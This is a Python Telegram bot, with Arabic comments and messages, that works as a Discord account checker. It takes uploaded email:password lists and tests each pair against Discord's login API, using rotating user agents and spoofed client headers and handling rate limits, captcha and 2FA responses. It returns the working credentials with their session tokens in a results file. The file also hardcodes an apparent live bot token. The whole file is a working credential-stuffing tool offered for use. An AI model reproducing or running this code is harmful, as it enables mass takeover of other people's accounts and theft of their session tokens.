import http.client
import json
import base64
import time
import asyncio
from telegram import Bot, Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
import os
import re
from datetime import datetime
from typing import List, Dict, Tuple
import random
import aiohttp
import aiofiles

# ============= إعدادات البوت =============
BOT_TOKEN = "8818745155:AAFNGU9SIbkKxzcZN62khYE-zAqiUDEUaSw"
ADMIN_IDS = [8703458182]  # ضع معرفات الأدمن هنا

# ============= القيم الثابتة =============
X_Super_Properties = {
    "os": "Windows",
    "browser": "Chrome",
    "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
}

# ============= دالة التحقق من الأدمن =============
def is_admin(user_id: int) -> bool:
    return user_id in ADMIN_IDS

# ============= كلاس المفحص =============
class DiscordChecker:
    def __init__(self):
        self.results = []
        self.total = 0
        self.processed = 0
        self.valid = 0
        self.invalid = 0
        self.start_time = None
        self.is_running = False
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        ]
        
    def get_headers(self) -> dict:
        user_agent = random.choice(self.user_agents)
        headers = {
            'User-Agent': user_agent,
            'Content-Type': 'application/json',
            'X-Super-Properties': base64.b64encode(json.dumps(X_Super_Properties).encode()).decode(),
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
            'Origin': 'https://discord.com',
            'Referer': 'https://discord.com/',
        }
        return headers

    def check_account(self, email: str, password: str, retry_count: int = 0) -> Tuple[bool, str, str]:
        try:
            if retry_count > 0:
                wait_time = min(2 ** retry_count, 60)
                time.sleep(wait_time)
            
            conn = http.client.HTTPSConnection("discord.com", timeout=30)
            
            login_json = {
                "login": email,
                "password": password,
                "undelete": False,
                "login_source": None,
                "gift_code_sku_id": None
            }
            
            login_payload = json.dumps(login_json, separators=(',', ':'))
            headers = self.get_headers()
            headers['Content-Length'] = str(len(login_payload))
            
            conn.request("POST", "/api/v9/auth/login", login_payload, headers)
            login_res = conn.getresponse().read()
            conn.close()
            
            if b'retry_after' in login_res or b'rate_limit' in login_res:
                if retry_count < 5:
                    return self.check_account(email, password, retry_count + 1)
                else:
                    return False, "Rate Limited", "⛔"
            
            try:
                response_data = json.loads(login_res)
                
                if 'errors' in response_data:
                    error = response_data['errors']
                    if 'login' in error:
                        error_code = error['login'].get('_errors', [{}])[0].get('code', '')
                        if error_code == "EMAIL_TYPE_INVALID_EMAIL":
                            return False, "Invalid Email", "❌"
                        elif error_code == "INVALID_PASSWORD":
                            return False, "Incorrect Password", "❌"
                        elif error_code == "EMAIL_UNCONFIRMED":
                            return False, "Email Not Confirmed", "⚠️"
                        else:
                            return False, f"Error: {error_code}", "❌"
                
                if 'captcha_key' in response_data:
                    return False, "Captcha Required", "⚠️"
                
                if 'token' in response_data:
                    return True, response_data['token'], "✅"
                
                if 'ticket' in response_data:
                    return False, "2FA Required", "🔐"
                    
            except json.JSONDecodeError:
                return False, "Invalid Response", "❌"
                
            return False, "Unknown Error", "❌"
            
        except Exception as e:
            return False, f"Error: {str(e)[:50]}", "❌"

    async def process_accounts(self, accounts: List[Tuple[str, str]], progress_callback=None) -> List[Dict]:
        self.is_running = True
        self.start_time = time.time()
        self.total = len(accounts)
        self.processed = 0
        self.valid = 0
        self.invalid = 0
        self.results = []
        
        for idx, (email, password) in enumerate(accounts, 1):
            if not self.is_running:
                break
                
            email = email.strip()
            password = password.strip()
            
            if not email or not password:
                continue
                
            success, token, status = self.check_account(email, password)
            
            result = {
                'email': email,
                'password': password,
                'success': success,
                'token': token if success else '',
                'status': status,
                'checked_at': datetime.now().isoformat()
            }
            
            self.results.append(result)
            self.processed = idx
            if success:
                self.valid += 1
            else:
                self.invalid += 1
            
            if progress_callback and (idx % 5 == 0 or idx == self.total):
                progress = {
                    'processed': self.processed,
                    'total': self.total,
                    'valid': self.valid,
                    'invalid': self.invalid,
                    'progress_percentage': (self.processed / self.total * 100),
                    'elapsed_time': int(time.time() - self.start_time),
                    'estimated_remaining': int((time.time() - self.start_time) / self.processed * (self.total - self.processed)) if self.processed > 0 else 0
                }
                await progress_callback(progress)
            
            if idx < len(accounts):
                await asyncio.sleep(random.uniform(0.5, 1.0))
        
        self.is_running = False
        return self.results

    def generate_results_file(self, filename: str = None) -> str:
        if not filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"discord_results_{timestamp}.txt"
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write("=" * 70 + "\n")
            f.write("🎮 DISCORD ACCOUNT CHECKER RESULTS\n")
            f.write(f"📅 Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("=" * 70 + "\n\n")
            
            f.write(f"📊 Total Checked: {self.total}\n")
            f.write(f"✅ Valid Accounts: {self.valid}\n")
            f.write(f"❌ Invalid Accounts: {self.invalid}\n")
            f.write(f"⏱️ Time Taken: {int(time.time() - self.start_time)} seconds\n")
            f.write(f"📈 Success Rate: {(self.valid/self.total*100):.1f}%\n")
            f.write("=" * 70 + "\n\n")
            
            if self.valid > 0:
                f.write("✅✅✅ VALID ACCOUNTS ✅✅✅\n")
                f.write("-" * 70 + "\n")
                for idx, result in enumerate(self.results, 1):
                    if result['success']:
                        f.write(f"[{idx}] Email: {result['email']}\n")
                        f.write(f"    Password: {result['password']}\n")
                        f.write(f"    Token: {result['token']}\n")
                        f.write("-" * 70 + "\n")
            
            if self.invalid > 0:
                f.write("\n❌❌❌ INVALID ACCOUNTS ❌❌❌\n")
                f.write("-" * 70 + "\n")
                for idx, result in enumerate(self.results, 1):
                    if not result['success']:
                        f.write(f"[{idx}] Email: {result['email']}\n")
                        f.write(f"    Password: {result['password']}\n")
                        f.write(f"    Status: {result['status']}\n")
                        f.write("-" * 70 + "\n")
        
        return filename

# ============= دوال بوت التيليجرام =============

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    is_admin_user = is_admin(user_id)
    
    welcome_msg = (
        "🤖 *Discord Account Checker Bot*\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
    )
    
    if is_admin_user:
        welcome_msg += (
            "👑 *مرحباً أيها الأدمن!*\n"
            "📤 أرسل لي ملف نصي يحتوي على الحسابات\n"
            "📝 الصيغة: `email:password`\n"
            "📌 كل حساب في سطر منفصل\n\n"
            "📊 سأقوم بفحصهم وارسال النتائج\n"
            "✅ حسابات صالحة مع التوكن\n"
            "❌ حسابات غير صالحة مع السبب\n\n"
            "⚙️ *أوامر الأدمن:*\n"
            "/stats - إحصائيات البوت\n"
            "/broadcast - إرسال رسالة للجميع\n"
            "/users - قائمة المستخدمين"
        )
    else:
        welcome_msg += (
            "👤 *مرحباً بك!*\n"
            "📤 أرسل لي ملف نصي يحتوي على الحسابات\n"
            "📝 الصيغة: `email:password`\n"
            "📌 كل حساب في سطر منفصل"
        )
    
    await update.message.reply_text(welcome_msg, parse_mode='Markdown')

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """معالجة الملف المرسل - الحل النهائي لمشكلة 404"""
    user_id = update.effective_user.id
    
    # تسجيل المستخدم
    if 'users' not in context.bot_data:
        context.bot_data['users'] = set()
    context.bot_data['users'].add(user_id)
    
    # رسالة مؤقتة
    status_msg = await update.message.reply_text("📥 *جاري معالجة الملف...*", parse_mode='Markdown')
    
    try:
        document = update.message.document
        if not document:
            await status_msg.edit_text("❌ *لم يتم العثور على ملف!*", parse_mode='Markdown')
            return
        
        # التحقق من نوع الملف
        file_name = document.file_name or "unknown.txt"
        if not file_name.lower().endswith(('.txt', '.csv')):
            await status_msg.edit_text(
                f"❌ *نوع الملف غير مدعوم!*\n"
                f"📝 الملف المرسل: `{file_name}`\n"
                f"✅ المدعوم: `.txt`, `.csv`",
                parse_mode='Markdown'
            )
            return
        
        # التحقق من حجم الملف
        file_size = document.file_size or 0
        max_size = 10 * 1024 * 1024  # 10 MB
        if file_size > max_size:
            await status_msg.edit_text(
                f"❌ *الملف كبير جداً!*\n"
                f"📊 حجم الملف: `{file_size / 1024 / 1024:.1f} MB`\n"
                f"📊 الحد الأقصى: `10 MB`",
                parse_mode='Markdown'
            )
            return
        
        if file_size == 0:
            await status_msg.edit_text("❌ *الملف فارغ!*", parse_mode='Markdown')
            return
        
        # ✅ **الحل الجذري: استخدام file_path الصحيح**
        await status_msg.edit_text(f"📥 *جاري تحميل الملف...*\n📊 الحجم: `{file_size / 1024:.1f} KB`", parse_mode='Markdown')
        
        # الحصول على كائن الملف
        file = await context.bot.get_file(document.file_id)
        
        # الحصول على المسار الصحيح للملف
        file_path = file.file_path  # هذا هو المفتاح!
        
        # إنشاء الرابط الصحيح لتحميل الملف
        file_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path}"
        
        # إنشاء اسم ملف مؤقت
        temp_filename = f"accounts_{user_id}_{int(time.time())}.txt"
        
        # تحميل الملف باستخدام aiohttp
        async with aiohttp.ClientSession() as session:
            async with session.get(file_url) as response:
                if response.status == 200:
                    content = await response.read()
                    with open(temp_filename, 'wb') as f:
                        f.write(content)
                else:
                    # إذا فشل الرابط، جرب download_to_drive كحل بديل
                    await status_msg.edit_text("🔄 *المحاولة بطريقة بديلة...*", parse_mode='Markdown')
                    await file.download_to_drive(temp_filename)
        
        # التحقق من وجود الملف بعد التحميل
        if not os.path.exists(temp_filename) or os.path.getsize(temp_filename) == 0:
            raise Exception("فشل تحميل الملف أو الملف فارغ")
        
        # قراءة الملف
        await status_msg.edit_text("📖 *جاري قراءة الملف...*", parse_mode='Markdown')
        
        with open(temp_filename, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        
        # حذف الملف المؤقت
        try:
            os.remove(temp_filename)
        except:
            pass
        
        # استخراج الحسابات
        accounts = []
        lines = content.split('\n')
        invalid_lines = 0
        
        for line in lines:
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            
            email = None
            password = None
            
            # دعم الصيغ المختلفة
            if ':' in line:
                parts = line.split(':', 1)
                if len(parts) == 2:
                    email = parts[0].strip()
                    password = parts[1].strip()
            elif '|' in line:
                parts = line.split('|', 1)
                if len(parts) == 2:
                    email = parts[0].strip()
                    password = parts[1].strip()
            
            # التحقق من صحة الإيميل
            if email and password and '@' in email and len(password) >= 4:
                accounts.append((email, password))
            else:
                invalid_lines += 1
        
        if not accounts:
            error_msg = "❌ *لم يتم العثور على حسابات صالحة في الملف!*\n\n"
            error_msg += "📝 الصيغة المدعومة: `email:password`\n"
            error_msg += "📌 كل حساب في سطر منفصل\n\n"
            error_msg += f"⚠️ عدد الأسطر غير الصالحة: `{invalid_lines}`"
            
            await status_msg.edit_text(error_msg, parse_mode='Markdown')
            return
        
        # بدء الفحص
        await status_msg.edit_text(
            f"🚀 *بدأت عملية الفحص!*\n\n"
            f"📊 عدد الحسابات: `{len(accounts)}`\n"
            f"⏳ جاري الفحص... سأرسل التحديثات",
            parse_mode='Markdown'
        )
        
        checker = DiscordChecker()
        last_update_time = 0
        
        async def send_progress(progress):
            nonlocal last_update_time
            current_time = time.time()
            if current_time - last_update_time >= 10 or progress['processed'] == progress['total']:
                last_update_time = current_time
                
                elapsed_min = progress['elapsed_time'] // 60
                elapsed_sec = progress['elapsed_time'] % 60
                remaining_min = progress['estimated_remaining'] // 60
                remaining_sec = progress['estimated_remaining'] % 60
                
                progress_msg = (
                    f"📊 *تحديث التقدم*\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"✅ تم الفحص: `{progress['processed']}/{progress['total']}`\n"
                    f"🎯 صالحة: `{progress['valid']}`\n"
                    f"❌ غير صالحة: `{progress['invalid']}`\n"
                    f"📈 النسبة: `{progress['progress_percentage']:.1f}%`\n"
                    f"⏱️ الوقت: `{elapsed_min}m {elapsed_sec}s`\n"
                    f"⏳ متبقي: `~{remaining_min}m {remaining_sec}s`"
                )
                await update.message.reply_text(progress_msg, parse_mode='Markdown')
        
        await checker.process_accounts(accounts, send_progress)
        
        # توليد ملف النتائج
        results_file = checker.generate_results_file()
        
        # إحصائيات النهائية
        success_rate = (checker.valid / checker.total * 100) if checker.total > 0 else 0
        elapsed = int(time.time() - checker.start_time)
        
        summary = (
            f"✅ *انتهت عملية الفحص!*\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📊 الإجمالي: `{checker.total}`\n"
            f"✅ صالحة: `{checker.valid}`\n"
            f"❌ غير صالحة: `{checker.invalid}`\n"
            f"📈 نسبة النجاح: `{success_rate:.1f}%`\n"
            f"⏱️ الوقت: `{elapsed} ثانية`"
        )
        
        await update.message.reply_text(summary, parse_mode='Markdown')
        
        # إرسال الملف
        with open(results_file, 'rb') as f:
            await update.message.reply_document(
                document=f,
                filename=os.path.basename(results_file),
                caption="📄 *ملف النتائج الكامل*\n✅ صالح | ❌ غير صالح",
                parse_mode='Markdown'
            )
        
        # حذف الملف المؤقت
        try:
            os.remove(results_file)
        except:
            pass
        
        # إشعار للأدمن
        for admin_id in ADMIN_IDS:
            try:
                await context.bot.send_message(
                    admin_id,
                    f"👤 مستخدم جديد استخدم البوت:\n"
                    f"🆔 ID: `{user_id}`\n"
                    f"📊 فحص: `{checker.total}` حساب\n"
                    f"✅ صالح: `{checker.valid}`",
                    parse_mode='Markdown'
                )
            except:
                pass
                
    except Exception as e:
        error_msg = str(e)
        await status_msg.edit_text(
            f"❌ *حدث خطأ:*\n"
            f"`{error_msg[:200]}`\n\n"
            f"💡 *نصائح:*\n"
            f"• تأكد من صحة الملف\n"
            f"• استخدم صيغة `email:password`\n"
            f"• أعد إرسال الملف مرة أخرى",
            parse_mode='Markdown'
        )
        print(f"Error in handle_file: {e}")

# ============= أوامر الأدمن =============

async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("⛔ *هذا الأمر مخصص للأدمن فقط!*", parse_mode='Markdown')
        return
    
    users_count = len(context.bot_data.get('users', set()))
    
    stats_msg = (
        f"📊 *إحصائيات البوت*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👥 عدد المستخدمين: `{users_count}`\n"
        f"🆔 الأدمن: `{len(ADMIN_IDS)}`\n"
        f"🤖 الحالة: `🟢 يعمل`\n"
        f"⏰ الوقت: `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`"
    )
    
    await update.message.reply_text(stats_msg, parse_mode='Markdown')

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("⛔ *هذا الأمر مخصص للأدمن فقط!*", parse_mode='Markdown')
        return
    
    message_text = update.message.text.replace('/broadcast', '').strip()
    
    if not message_text:
        await update.message.reply_text(
            "❌ *يرجى كتابة الرسالة بعد الأمر*\n"
            "مثال: `/broadcast مرحباً بالجميع!`",
            parse_mode='Markdown'
        )
        return
    
    users = context.bot_data.get('users', set())
    
    if not users:
        await update.message.reply_text("❌ *لا يوجد مستخدمين لإرسال الرسالة لهم*", parse_mode='Markdown')
        return
    
    sent = 0
    failed = 0
    
    status_msg = await update.message.reply_text(
        f"📤 *جاري إرسال الرسالة...*\n"
        f"👥 المستخدمين: `{len(users)}`",
        parse_mode='Markdown'
    )
    
    for user in users:
        try:
            await context.bot.send_message(
                user,
                f"📢 *إشعار من الأدمن*\n\n{message_text}",
                parse_mode='Markdown'
            )
            sent += 1
            await asyncio.sleep(0.1)
        except:
            failed += 1
    
    await status_msg.edit_text(
        f"✅ *تم إرسال الرسالة!*\n"
        f"📤 تم الإرسال: `{sent}`\n"
        f"❌ فشل: `{failed}`",
        parse_mode='Markdown'
    )

async def users_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("⛔ *هذا الأمر مخصص للأدمن فقط!*", parse_mode='Markdown')
        return
    
    users = context.bot_data.get('users', set())
    
    if not users:
        await update.message.reply_text("❌ *لا يوجد مستخدمين مسجلين*", parse_mode='Markdown')
        return
    
    users_list = "\n".join([f"🆔 `{u}`" for u in list(users)[:20]])
    
    users_msg = (
        f"👥 *قائمة المستخدمين*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"الإجمالي: `{len(users)}`\n\n"
        f"{users_list}"
    )
    
    if len(users) > 20:
        users_msg += f"\n\n... و `{len(users) - 20}` مستخدم آخر"
    
    await update.message.reply_text(users_msg, parse_mode='Markdown')

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "⏹️ *تم إيقاف العملية*\n"
        "📊 يمكنك البدء من جديد بإرسال ملف آخر",
        parse_mode='Markdown'
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    is_admin_user = is_admin(user_id)
    
    help_msg = (
        "📖 *طريقة الاستخدام:*\n\n"
        "1️⃣ أرسل ملف نصي بصيغة `.txt`\n"
        "2️⃣ كل سطر يحتوي على `email:password`\n"
        "3️⃣ انتظر حتى انتهاء الفحص\n"
        "4️⃣ استلم ملف النتائج\n\n"
        "📌 *الأوامر المتاحة:*\n"
        "/start - بدء البوت\n"
        "/stop - إيقاف العملية\n"
        "/help - هذه الرسالة"
    )
    
    if is_admin_user:
        help_msg += (
            "\n\n👑 *أوامر الأدمن:*\n"
            "/stats - إحصائيات البوت\n"
            "/broadcast - إرسال رسالة للجميع\n"
            "/users - قائمة المستخدمين"
        )
    
    await update.message.reply_text(help_msg, parse_mode='Markdown')

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print(f"❌ حدث خطأ: {context.error}")
    
    for admin_id in ADMIN_IDS:
        try:
            await context.bot.send_message(
                admin_id,
                f"⚠️ *خطأ في البوت*\n"
                f"🆔 مستخدم: `{update.effective_user.id if update else 'Unknown'}`\n"
                f"❌ الخطأ: `{str(context.error)[:200]}`",
                parse_mode='Markdown'
            )
        except:
            pass

# ============= التشغيل الرئيسي =============

def main():
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("❌ خطأ: يرجى وضع توكن البوت في المتغير BOT_TOKEN")
        return
    
    if not ADMIN_IDS:
        print("⚠️ تحذير: لم يتم تحديد أي أدمن!")
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    # إضافة المعالجات
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("stats", stats))
    app.add_handler(CommandHandler("broadcast", broadcast))
    app.add_handler(CommandHandler("users", users_list))
    
    # معالجة الملفات
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    
    # معالج الأخطاء
    app.add_error_handler(error_handler)
    
    print("🤖 Bot is running...")
    print(f"👑 Admins: {ADMIN_IDS}")
    print("📤 أرسل ملف txt يحتوي على الحسابات")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
